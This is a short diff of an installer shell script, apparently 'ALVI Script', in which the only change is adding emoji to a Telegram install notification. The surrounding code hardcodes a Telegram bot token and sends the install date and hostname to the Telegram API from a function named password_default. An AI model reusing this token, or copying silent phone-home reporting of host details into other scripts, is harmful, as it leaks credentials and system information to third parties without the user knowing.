@@ -344,7 +344,7 @@ function password_default() {
     KEY="6676451249:AAFC5J7CSeYIXmpOS-6WP3n5-b7mqh9hVN8"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi ALVI Script Stable V3.0
+    TEXT="🥷Installasi ALVI Script Stable V3.0🥷
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
